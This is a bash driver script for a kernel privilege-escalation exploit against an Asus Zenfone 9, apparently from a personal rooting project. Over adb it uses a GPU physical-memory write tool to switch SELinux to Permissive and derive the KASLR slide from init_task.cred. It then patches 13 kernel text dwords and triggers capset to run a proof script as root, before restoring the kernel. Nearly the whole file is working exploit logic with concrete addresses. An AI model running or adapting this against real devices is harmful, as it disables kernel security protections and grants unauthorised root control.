#!/usr/bin/env bash
# root-burst.sh — reliable root: one fast in-process burst (patch + trigger + proof), then restore.
#
# Why this shape (ROADMAP 5b/5f/5g):
#   * the GPU must be ACTIVELY RENDERING — screen awake plus something drawing — and we verify the
#     animation is alive before touching anything (an unverified animation is what silently broke the
#     earlier demo runs);
#   * writes land but appear to be REVERTED shortly after, so the patch and the capset trigger must
#     happen back-to-back inside ONE process (cheese_pa's ROOT mode writes 13 dwords with 2 ms gaps
#     and triggers immediately), not as 13 separate processes over minutes;
#   * acceptance is the KERNEL's own view: getuid() from the trigger, and getenforce for the flip.
#     Our GPU readback is not trustworthy as a success criterion.
set -u
DIR=$(cd "$(dirname "$0")" && pwd)
[ -f "$DIR/../device.env" ] && . "$DIR/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
PROOF=${PROOF:-/data/local/tmp/proof.sh}
STAMP=$(date +%Y%m%d-%H%M%S)
LOG=$HOME/Dev/zenfone9-root/logs/burst-$STAMP
mkdir -p "$LOG"

adb_s() { adb -s "$S" shell "$1" </dev/null 2>&1 | tr -d '\r'; }
rd() {
    adb_s "CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 timeout 120 /data/local/tmp/cheese_pa > /data/local/tmp/rb.txt 2>&1; grep -o 'value=0x[0-9a-f]*' /data/local/tmp/rb.txt | head -1" | sed 's/value=//'
}
wr() {
    adb_s "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 CHEESE_WRITE_PA=$1 CHEESE_WRITE_VAL=$2 timeout 240 /data/local/tmp/cheese_pa > /data/local/tmp/rb.txt 2>&1; grep -o 'POKE write.*' /data/local/tmp/rb.txt"
}
anim_on() {
    adb -s "$S" push "$DIR/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
    adb_s 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' >/dev/null
    adb_s 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' >/dev/null
    adb_s 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' >/dev/null
    sleep 4
    local n; n=$(adb_s 'pgrep -f anim.sh | wc -l')
    [ "${n:-0}" -ge 1 ] || { echo "[burst] FATAL: animation not alive"; return 1; }
    echo "[burst] animation alive ($n procs), wakefulness=$(adb_s 'dumpsys power | grep -m1 mWakefulness=')"
}
anim_off() { adb_s 'pkill -f anim.sh; svc power stayon false' >/dev/null 2>&1; }

restore() {
    echo "[burst] restoring kernel text + SELinux..."
    anim_on >/dev/null 2>&1 || true
    ORIG=(d503233f d10203ff f800865e a9047bfd a9055ff8 a90657f6 a9074ff4 910103fd 90010d28 f9448908 aa0103f4 910073e1 aa0003f5)
    for i in $(seq 0 12); do
        a=$(printf '0x%x' $((0xa8145af0 + 4 * i)))
        case "$(wr "$a" "${ORIG[$i]}")" in
            *VERIFIED*) ;;
            *) echo "  restore[$i] $a unverified" ;;
        esac
    done
    for i in 1 2 3 4 5; do
        wr 0xaaa40b98 0x01010001 >/dev/null
        [ "$(adb_s getenforce)" = Enforcing ] && break
        sleep 1
    done
    echo "[burst] text[0]=$(rd 0xa8145af0) (expect 0xd503233f)  selinux=$(adb_s getenforce)"
    anim_off
}
trap restore EXIT INT TERM

# --- settle: something re-asserts SELinux enforcing early in boot, so don't fight it there ---
up=$(adb_s 'cut -d. -f1 /proc/uptime')
if [ "${up:-0}" -lt 180 ]; then
    echo "[burst] device only ${up}s since boot; waiting for it to settle (vendor services may re-assert SELinux)"
    while [ "$(adb_s 'cut -d. -f1 /proc/uptime')" -lt 180 ]; do sleep 10; done
fi
echo "[burst] uptime settled: $(adb_s 'cut -d. -f1 /proc/uptime')s"

anim_on || exit 1

echo "[burst] SELinux -> Permissive (acceptance = getenforce, must stick)"
stuck=0
for i in $(seq 1 8); do
    wr 0xaaa40b98 0x01010000 >/dev/null
    sleep 1
    if [ "$(adb_s getenforce)" = Permissive ]; then
        sleep 4
        if [ "$(adb_s getenforce)" = Permissive ]; then stuck=1; break; fi
        echo "[burst]   flipped then reverted on attempt $i"
    fi
done
[ "$stuck" = 1 ] || { echo "[burst] SELinux will not stay Permissive - aborting"; exit 1; }
echo "[burst] getenforce: $(adb_s getenforce) (sticky)"

echo "[burst] deriving slide from init_task.cred..."
lo=$(rd 0xaa79c640); hi=$(rd 0xaa79c644)
RT=$(python3 - "$lo" "$hi" <<'PY'
import sys
lo = int(sys.argv[1], 16); hi = int(sys.argv[2], 16)
rt = (hi << 32) | lo
LINK_INIT_CRED = 0xffffffc00a7b0ae0
LINK_COMMIT    = 0xffffffc008184c94
slide = rt - LINK_INIT_CRED
assert slide % 0x200000 == 0, "slide not 2MB aligned"
print("%#x %#x" % (rt, LINK_COMMIT + slide))
PY
)
IC=$(echo "$RT" | cut -d' ' -f1); CC=$(echo "$RT" | cut -d' ' -f2)
echo "[burst] init_cred_rt=$IC commit_creds_rt=$CC"

echo "[burst] === single-process burst: patch 13 dwords, trigger capset, run proof as root ==="
adb -s "$S" shell "CHEESE_ROOT=1 CHEESE_NO_RETRY=1 CHEESE_INIT_CRED_RT=$IC CHEESE_COMMIT_RT=$CC \
CHEESE_ROOT_EXEC='sh $PROOF' timeout 300 /data/local/tmp/cheese_pa" </dev/null 2>&1 | tee "$LOG/burst.txt" | tail -14

echo "[burst] === rendering the on-device proof page ==="
adb_s 'am start -a android.intent.action.VIEW -d file:///sdcard/root-proof.html -t text/html' >/dev/null
sleep 4
adb -s "$S" exec-out screencap -p > "$LOG/root-proof-screen.png" 2>/dev/null
echo "[burst] screenshot: $LOG/root-proof-screen.png ($(du -h "$LOG/root-proof-screen.png" 2>/dev/null | cut -f1))"

restore
trap - EXIT INT TERM
echo "[burst] logdir: $LOG"
